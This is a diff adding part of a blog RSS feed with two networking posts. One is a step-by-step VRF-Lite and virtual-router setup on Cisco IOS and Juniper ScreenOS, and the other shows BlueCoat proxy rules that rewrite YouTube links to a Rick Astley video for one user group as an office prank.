+S*   0.0.0.0/0 [1/0] via 1.1.1.1
+
+Routing Table: Untrust
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     10.0.0.0/24 is subnetted, 1 subnets
+C       10.10.10.0 is directly connected, GigabitEthernet0/0.100
+
+Routing Table: Trust
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.400
+     172.16.0.0/24 is subnetted, 1 subnets
+C       172.16.10.0 is directly connected, GigabitEthernet0/0.200
+
+Routing Table: DMZ
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     10.0.0.0/24 is subnetted, 1 subnets
+C       10.10.10.0 is directly connected, GigabitEthernet0/0.300
+ios-1#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now lets do a little routing.  Just like in the JunOS example a simple static route should be sufficient.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#ip route vrf Trust 0.0.0.0 0.0.0.0 192.168.10.2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;Trust&lt;/code&gt; routing instance table now looks like the following.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#do show ip route vrf Trust
+
+Routing Table: Trust
+Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2
+       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
+       ia - IS-IS inter area, * - candidate default, U - per-user static route
+       o - ODR, P - periodic downloaded static route
+
+Gateway of last resort is 192.168.10.2 to network 0.0.0.0
+
+C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.400
+     172.16.0.0/24 is subnetted, 1 subnets
+C       172.16.10.0 is directly connected, GigabitEthernet0/0.200
+S*   0.0.0.0/0 [1/0] via 192.168.10.2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;setup-screenos:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Juniper ScreenOS&lt;/h3&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/ssg-5-shjpg.jpeg&#34; border=&#34;0&#34; alt=&#34;SSG-5-SH.jpg.jpeg&#34; width=&#34;300&#34; height=&#34;60&#34; /&gt;&lt;/div&gt;
+
+&lt;p&gt;Juniper ScreenOS version 6.2.0r2.0 used here is very new and has been working
+very well for me in testing.&lt;/p&gt;
+
+&lt;p&gt;There are also a few more limitations on the ScreenOS platform that I need to
+make note of. The SSG5 I am using has a limit of only 3 routing instances and
+some other limits that you should verify yourself before starting. Using the
+command &lt;code&gt;get license-key&lt;/code&gt; will show all the limits for the hardware. The key
+things to look for are: &lt;em&gt;Vrouters&lt;/em&gt;, &lt;em&gt;Zones&lt;/em&gt;, and &lt;em&gt;VLANs&lt;/em&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get license-key 
+extended_key        : XXXXXXXXXXXXX+XXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXX
+                      XXXXXXXXXXXXXXXXXXX/
+                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                      XXXXXXXXXXXXXXXXXXXXXXXX/
+                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXX/
+                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXXXXXX
+                      /XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX++XXXXXXXXXXXXXX/
+                      XXXXXXXXXXXXXX+XXXXXX+XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                      ==
+
+Sessions:           16064 sessions
+Capacity:           unlimited number of users
+NSRP:               ActiveActive
+VPN tunnels:        40 tunnels
+Vsys:               None
+Vrouters:           4 virtual routers
+Zones:              10 zones
+VLANs:              50 vlans
+Drp:                Enable
+Deep Inspection:    Enable
+Deep Inspection Database Expire Date: Disable
+Signature pack:     Signature update key is missing
+IDP:                Disable
+AV:                 Disable(0)
+Anti-Spam:          Disable(0)
+Url Filtering:      Disable
+
+Update server url: nextwave.netscreen.com/key_retrieval
+License key auto update : Disabled
+Auto update interval : 0 days
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Unlike IOS and JunOS: ScreenOS does not have a concept of Global routing
+instance. Every interface must be in routing instances and can not have any
+addresses assigned when you move them to a different instance. Due to this, you
+really should start off in a different order and create the routing instances
+first.&lt;/p&gt;
+
+&lt;p&gt;The default ScreenOS puts all interfaces into the &lt;code&gt;Trust-vr&lt;/code&gt; routing instance so
+let&amp;rsquo;s start by checking what is already set up.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get vrouter
+* indicates default vrouter 
+A - AutoExport, R - RIP, N- NHRP, O - OSPF, B - BGP, P - PIM
+
+   ID Name                     Vsys                 Owner     Routes    MRoutes     Flags
+    1 untrust-vr               Root                 shared      0/max       0/max       
+*   2 trust-vr                 Root                 shared      4/max       0/max       
+
+total 2 vrouters shown and 0 of them defined by user
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see there are already 2 routing instances set up. Let&amp;rsquo;s take a look
+at the interfaces that belong to each. To do this we need to see what zones are
+mapped to which routing instances.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get zone  
+Total 14 zones created in vsys Root - 8 are policy configurable.
+Total policy configurable zones for Root is 8.
+;------------------------------------------------------------------------
+  ID Name                             Type    Attr    VR          Default-IF   VSYS      
+   0 Null                             Null    Shared untrust-vr   wireless0/3  Root                
+   1 Untrust                          Sec(L3) Shared trust-vr     ethernet0/0  Root                
+   2 Trust                            Sec(L3)        trust-vr     bgroup0      Root                
+   3 DMZ                              Sec(L3)        trust-vr     ethernet0/1  Root                
+   4 Self                             Func           trust-vr     self         Root                
+   5 MGT                              Func           trust-vr     null         Root                
+   6 HA                               Func           trust-vr     null         Root                
+  10 Global                           Sec(L3)        trust-vr     null         Root                
+  11 V1-Untrust                       Sec(L2) Shared trust-vr     v1-untrust   Root                
+  12 V1-Trust                         Sec(L2) Shared trust-vr     v1-trust     Root                
+  13 V1-DMZ                           Sec(L2) Shared trust-vr     v1-dmz       Root                
+  14 VLAN                             Func    Shared trust-vr     vlan1        Root                
+  15 V1-Null                          Sec(L2) Shared trust-vr     l2v          Root                
+  16 Untrust-Tun                      Tun            trust-vr     hidden.1     Root                
+;------------------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we have to map the interfaces to the zones. (Yes, it may seem a little
+convoluted but it does make sense for a firewall platform).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get interface 
+
+A - Active, I - Inactive, U - Up, D - Down, R - Ready 
+
+Interfaces in vsys Root: 
+Name           IP Address                        Zone        MAC            VLAN State VSD      
+serial0/0      0.0.0.0/0                         Null        N/A               -   D   -  
+eth0/0         0.0.0.0/0                         Untrust     0017.cb80.9f40    -   U   -  
+eth0/1         0.0.0.0/0                         DMZ         0017.cb80.9f45    -   D   -  
+wireless0/0    192.168.2.1/24                    Trust       0017.cb80.9f55    -   D   -  
+wireless0/1    0.0.0.0/0                         Null        0017.cb80.9f56    -   D   -  
+wireless0/2    0.0.0.0/0                         Null        0017.cb80.9f57    -   D   -  
+wireless0/3    0.0.0.0/0                         Null        0017.cb80.9f58    -   D   -  
+bgroup0        192.168.1.1/24                    Trust       0017.cb80.9f4b    -   U   -  
+  eth0/2       N/A                               N/A         N/A               -   U   -
+  eth0/3       N/A                               N/A         N/A               -   D   -
+  eth0/4       N/A                               N/A         N/A               -   D   -
+  eth0/5       N/A                               N/A         N/A               -   D   -
+  eth0/6       N/A                               N/A         N/A               -   D   -
+bgroup1        0.0.0.0/0                         Null        0017.cb80.9f4c    -   D   -  
+bgroup2        0.0.0.0/0                         Null        0017.cb80.9f4d    -   D   -  
+bgroup3        0.0.0.0/0                         Null        0017.cb80.9f4e    -   D   -  
+vlan1          0.0.0.0/0                         VLAN        0017.cb80.9f4f    1   D   -  
+null           0.0.0.0/0                         Null        N/A               -   U   0  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We now have all the information we need to begin the process. Here is a
+simplified table to make moving forward a little easier:&lt;/p&gt;
+
+&lt;h5 id=&#34;current:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Current&lt;/h5&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Interface&lt;/th&gt;
+&lt;th&gt;Zone&lt;/th&gt;
+&lt;th&gt;Routing Instance&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;serial0/0&lt;/td&gt;
+&lt;td&gt;Null&lt;/td&gt;
+&lt;td&gt;trust-vr&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;eth0/0&lt;/td&gt;
+&lt;td&gt;Untrust&lt;/td&gt;
+&lt;td&gt;trust-vr&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;eth0/1&lt;/td&gt;
+&lt;td&gt;DMZ&lt;/td&gt;
+&lt;td&gt;trust-vr&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;wireless0/0&lt;/td&gt;
+&lt;td&gt;Trust&lt;/td&gt;
+&lt;td&gt;trust-vr&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s start by creating the one routing instance that is not already setup by default.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set vrouter name dmz-vr
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s see how this shows up on the device.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;creenos-1-&amp;gt; get vrouter
+* indicates default vrouter 
+A - AutoExport, R - RIP, N- NHRP, O - OSPF, B - BGP, P - PIM
+
+   ID Name                     Vsys                 Owner     Routes    MRoutes     Flags
+    1 untrust-vr               Root                 shared      0/max       0/max       
+*   2 trust-vr                 Root                 shared      4/max       0/max       
+ 1025 dmz-vr                   Root                 user        0/max       0/max       
+
+total 3 vrouters shown and 1 of them defined by user
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Due to the limitations of not allowing the movement of a zone between routing
+instances when there are interfaces within them, we need to move things around
+first. Let&amp;rsquo;s start by moving all the interfaces that are in the &lt;em&gt;Trust&lt;/em&gt; and
+&lt;em&gt;DMZ&lt;/em&gt; zones to a holder zone named &lt;em&gt;Null&lt;/em&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set interface eth0/0 zone Null
+screenos-1-&amp;gt; set interface eth0/1 zone Null
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we need to move the zones to the correct routing instances, and while we&amp;rsquo;re
+at it let&amp;rsquo;s move the interfaces back and create new sub-interfaces.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set zone Untrust vrouter untrust-vr
+screenos-1-&amp;gt; set zone DMZ vrouter dmz-vr
+screenos-1-&amp;gt; set interface eth0/0 zone Untrust
+screenos-1-&amp;gt; set interface eth0/1 zone DMZ
+screenos-1-&amp;gt; set interface eth0/0.1 tag 100 zone Untrust
+screenos-1-&amp;gt; set interface eth0/0.2 tag 200 zone Trust
+screenos-1-&amp;gt; set interface eth0/0.3 tag 300 zone DMZ
+screenos-1-&amp;gt; set interface eth0/0.4 tag 400 zone Trust
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, let&amp;rsquo;s setup the interface addresses.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set interface eth0/0.1 ip 10.10.10.1/24
+screenos-1-&amp;gt; set interface eth0/0.2 ip 172.16.10.1/24
+screenos-1-&amp;gt; set interface eth0/0.3 ip 10.10.10.1/24
+screenos-1-&amp;gt; set interface eth0/0.4 ip 192.168.10.1/24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we should take a look and see that everything has come out the way we
+expected. First, the interfaces:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get interface 
+
+A - Active, I - Inactive, U - Up, D - Down, R - Ready 
+
+Interfaces in vsys Root: 
+Name           IP Address                        Zone        MAC            VLAN State VSD      
+serial0/0      0.0.0.0/0                         Null        N/A               -   D   -  
+eth0/0         0.0.0.0/0                         Untrust     0017.cb80.9f40    -   U   -  
+eth0/0.1       0.0.0.0/0                         Untrust     0017.cb80.9f40  100   U   -  
+eth0/0.2       0.0.0.0/0                         Trust       0017.cb80.9f40  200   U   -  
+eth0/0.3       0.0.0.0/0                         DMZ         0017.cb80.9f40  300   U   -  
+eth0/0.4       0.0.0.0/0                         Trust       0017.cb80.9f40  400   U   -  
+eth0/1         0.0.0.0/0                         DMZ         0017.cb80.9f45    -   D   -  
+wireless0/0    192.168.2.1/24                    Trust       0017.cb80.9f55    -   D   -  
+wireless0/1    0.0.0.0/0                         Null        0017.cb80.9f56    -   D   -  
+wireless0/2    0.0.0.0/0                         Null        0017.cb80.9f57    -   D   -  
+wireless0/3    0.0.0.0/0                         Null        0017.cb80.9f58    -   D   -  
+bgroup0        192.168.1.1/24                    Trust       0017.cb80.9f4b    -   U   -  
+  eth0/2       N/A                               N/A         N/A               -   U   -
+  eth0/3       N/A                               N/A         N/A               -   D   -
+  eth0/4       N/A                               N/A         N/A               -   D   -
+  eth0/5       N/A                               N/A         N/A               -   D   -
+  eth0/6       N/A                               N/A         N/A               -   D   -
+bgroup1        0.0.0.0/0                         Null        0017.cb80.9f4c    -   D   -  
+bgroup2        0.0.0.0/0                         Null        0017.cb80.9f4d    -   D   -  
+bgroup3        0.0.0.0/0                         Null        0017.cb80.9f4e    -   D   -  
+vlan1          0.0.0.0/0                         VLAN        0017.cb80.9f4f    1   D   -  
+null           0.0.0.0/0                         Null        N/A               -   U   0  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now the routing instances:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get route
+H: Host C: Connected S: Static A: Auto-Exported
+I: Imported R: RIP P: Permanent D: Auto-Discovered
+N: NHRP
+iB: IBGP eB: EBGP O: OSPF E1: OSPF external type 1
+E2: OSPF external type 2 trailing B: backup route
+
+
+IPv4 Dest-Routes for &amp;lt;untrust-vr&amp;gt; (2 entries)
+;--------------------------------------------------------------------------------------
+         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr     Vsys
+;--------------------------------------------------------------------------------------
+*         2      10.10.10.1/32       eth0/0.1         0.0.0.0   H    0      0     Root
+*         1      10.10.10.0/24       eth0/0.1         0.0.0.0   C    0      0     Root
+
+
+
+IPv4 Dest-Routes for &amp;lt;trust-vr&amp;gt; (8 entries)
+;--------------------------------------------------------------------------------------
+         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr     Vsys
+;--------------------------------------------------------------------------------------
+*         5     172.16.10.0/24       eth0/0.2         0.0.0.0   C    0      0     Root
+*         8    192.168.10.1/32       eth0/0.4         0.0.0.0   H    0      0     Root
+*         4     192.168.1.1/32        bgroup0         0.0.0.0   H    0      0     Root
+          2     192.168.2.1/32    wireless0/0         0.0.0.0   H    0      0     Root
+          1     192.168.2.0/24    wireless0/0         0.0.0.0   C    0      0     Root
+*         3     192.168.1.0/24        bgroup0         0.0.0.0   C    0      0     Root
+*         7    192.168.10.0/24       eth0/0.4         0.0.0.0   C    0      0     Root
+*         6     172.16.10.1/32       eth0/0.2         0.0.0.0   H    0      0     Root
+
+
+
+IPv4 Dest-Routes for &amp;lt;dmz-vr&amp;gt; (2 entries)
+;--------------------------------------------------------------------------------------
+         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr
+;--------------------------------------------------------------------------------------
+*         2      10.10.10.1/32       eth0/0.3         0.0.0.0   H    0      0         
+*         1      10.10.10.0/24       eth0/0.3         0.0.0.0   C    0      0         
+
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Based on the findings of the report, my conclusion was that this idea was not
+a practical deterrent for reasons which at this moment must be all too obvious.&lt;/p&gt;
+
+&lt;p&gt;Dr. Strangelove&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;footnotes:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Footnotes&lt;/h2&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Vendor&lt;/th&gt;
+&lt;th&gt;OS&lt;/th&gt;
+&lt;th&gt;VRF-Lite&lt;/th&gt;
+&lt;th&gt;VRF&lt;/th&gt;
+&lt;th&gt;Notes&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Juniper&lt;/td&gt;
+&lt;td&gt;JunOS&lt;/td&gt;
+&lt;td&gt;Virtual Router&lt;/td&gt;
+&lt;td&gt;VRF&lt;/td&gt;
+&lt;td&gt;JunOS has many others ways of preforming VRF functions. More details &lt;a href=&#34;http://www.juniper.net/techpubs/software/junos/junos85/swconfig85-vpns/frameset.html&#34;&gt;here&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Juniper&lt;/td&gt;
+&lt;td&gt;ScreenOS&lt;/td&gt;
+&lt;td&gt;Virtual Router&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Cisco&lt;/td&gt;
+&lt;td&gt;IOS&lt;/td&gt;
+&lt;td&gt;VRF Lite&lt;/td&gt;
+&lt;td&gt;VRF&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Cisco&lt;/td&gt;
+&lt;td&gt;NX-OS&lt;/td&gt;
+&lt;td&gt;VRF Lite&lt;/td&gt;
+&lt;td&gt;VRF&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Cisco&lt;/td&gt;
+&lt;td&gt;ASA&lt;/td&gt;
+&lt;td&gt;Contexts&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Cisco&lt;/td&gt;
+&lt;td&gt;PIXOS&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;div class=&#34;footnotes&#34;&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;MAN is a Metropolitan Area Network: &lt;a href=&#34;http://en.wikipedia.org/wiki/Metropolitan_Area_Network&#34;&gt;Wikipedia&lt;/a&gt;
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;I should take a second and also point out that Cisco has a long and &lt;em&gt;s.l.o.w&lt;/em&gt; history of making managements services available via a vrf.  In fact, so many features cannot be enabled inside a VRF that most just use the global routing table for management and push all production traffic into VRFs.
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;Table of Vender and VRF naming conventions
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;Yes, yes. I know I could do everything at once and commit last, and that is one of the reasons I love JunOS, but this is also about building and seeing each change and how it affects the overall router
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>RickRoll Everyone with BlueCoat</title>
+      <link>https://jeremyrossi.com/blog/2009/03/16/rickroll-everyone-with-bluecoat/</link>
+      <pubDate>Mon, 16 Mar 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/03/16/rickroll-everyone-with-bluecoat/</guid>
+      <description>
+
+&lt;h3 id=&#34;bluecoat-proxy:691bb6c52833216ab2a99f88295d4f41&#34;&gt;BlueCoat Proxy&lt;/h3&gt;
+
+&lt;p&gt;The &lt;a href=&#34;http://www.bluecoat.com/products/sg&#34;&gt;Bluecoat SGOS&lt;/a&gt; can do a fair amount
+of stuff just like any web-proxy should, but my favorite is to
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Rickrolling&#34;&gt;RickRoll&lt;/a&gt; the whole
+company.  ( &lt;em&gt;People spend to much time on youtube as is&lt;/em&gt; ).&lt;/p&gt;
+
+&lt;p&gt;In this example users are authenticated with NTML back ended by Windows
+Active Directory. See the docs from Bluecoat on how to set this up.&lt;/p&gt;
+
+&lt;h4 id=&#34;definitions-conditions:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Definitions Conditions&lt;/h4&gt;
+
+&lt;p&gt;Conditions allow you to control when things should happen. They do
+nothing by themselves, but get put together later to preform some real
+fun.&lt;/p&gt;
+
+&lt;p&gt;The first definition here matches only member of the group
+&lt;code&gt;DOMAINpxy_rickrolld&lt;/code&gt;. You could make this users or just about that
+think you would like. I choice the group method to make it simple to add
+and remove effected users.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define condition group_to_be_rickrolled realm=active_directory
+  group=DOMAIN\pxy_rickrolld end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The second definition just matches does a REGEX to match the domain
+&amp;ldquo;&lt;code&gt;youtube&lt;/code&gt;&amp;rdquo; and looks for the string &amp;ldquo;&lt;code&gt;watch&lt;/code&gt;&amp;rdquo; in the url path. The use
+of REGEX really is not the best way to do this, but I figured showing
+both methods of matching was worth the slight performance hit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define condition match_url_to_rickroll
+    url.host.regex=&amp;quot;youtube&amp;quot; url.path.substring=watch 
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;definitions-actions:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Definitions Actions&lt;/h4&gt;
+
+&lt;p&gt;Actions are define something to do with a request. In this case
+we are going to rewrite the request and change the video to the
+&amp;ldquo;&lt;code&gt;oHg5SJYRHA0&lt;/code&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define action youtube_change_to_rickroll
+    rewrite( url, &amp;quot;(http://.*/watch?v=)([^&amp;amp;]+)(.*)&amp;quot;, &amp;quot;$(1)oHg5SJYRHA0$(3)&amp;quot; )
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Given the initial url of &amp;ldquo;&lt;code&gt;http://www.youtube.com/watch?v=OBghD0XBN5M&amp;amp;feature=related&lt;/code&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;The rewrite functions second argument is a REGEX that stores the following:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&amp;ldquo;&lt;code&gt;http://www.youtube.com/watch?v=&lt;/code&gt;&amp;rdquo; in variable &amp;ldquo;&lt;code&gt;$(1)&lt;/code&gt;&amp;rdquo;.&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;&lt;code&gt;&amp;amp;feature=related&lt;/code&gt;&amp;rdquo; in variable &amp;ldquo;&lt;code&gt;$(3)&lt;/code&gt;&amp;rdquo;.&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The third argument is the Newly created url that simply puts the data
+back together with our selected Video ID.&lt;/p&gt;
+
+&lt;h4 id=&#34;proxy-section:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Proxy Section&lt;/h4&gt;
+
+&lt;p&gt;Now that you have everything defined you need to put it all to use.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;lt;Proxy&amp;gt; 
+    condition=match_url_to_rickroll condition=group_to_be_rickrolled 
+action.youtube_change_to_rickroll(yes) 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This will pull all the define from above to select when to preform the
+rewrite function. Putting this in place is fun, but it really does make
+people mad for some reason.&lt;/p&gt;
+
+&lt;h3 id=&#34;completed-fun:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Completed Fun&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;define condition group_to_be_rickrolled
+    realm=active_directory group=DOMAIN\pxy_rickrolld 
+end
+define condition match_url_to_rickroll
+    url.host.regex=&amp;quot;youtube&amp;quot; url.path.substring=watch 
+end	
+define action youtube_change_to_rickroll
+    rewrite( url, &amp;quot;(http://.*/watch?v=)([^&amp;amp;]+)(.*)&amp;quot;, &amp;quot;$(1)oHg5SJYRHA0$(3)&amp;quot; )
+end
+
+&amp;lt;Proxy&amp;gt; 
+    condition=match_url_to_rickroll condition=group_to_be_rickrolled action.youtube_change_to_rickroll(yes) 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;results:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Results&lt;/h3&gt;
+
+&lt;p&gt;Well of course it had to be done.&lt;/p&gt;
+
+&lt;p&gt;&lt;object width=&#34;425&#34; height=&#34;344&#34;&gt;&lt;param name=&#34;movie&#34; value=&#34;http://www.youtube.com/v/oHg5SJYRHA0&amp;hl=en&amp;fs=1&#34;&gt;&lt;/param&gt;&lt;param name=&#34;allowFullScreen&#34; value=&#34;true&#34;&gt;&lt;/param&gt;&lt;param name=&#34;allowscriptaccess&#34; value=&#34;always&#34;&gt;&lt;/param&gt;&lt;embed src=&#34;http://www.youtube.com/v/oHg5SJYRHA0&amp;hl=en&amp;fs=1&#34; type=&#34;application/x-shockwave-flash&#34; allowscriptaccess=&#34;always&#34; allowfullscreen=&#34;true&#34; width=&#34;425&#34; height=&#34;344&#34;&gt;&lt;/embed&gt;&lt;/object&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
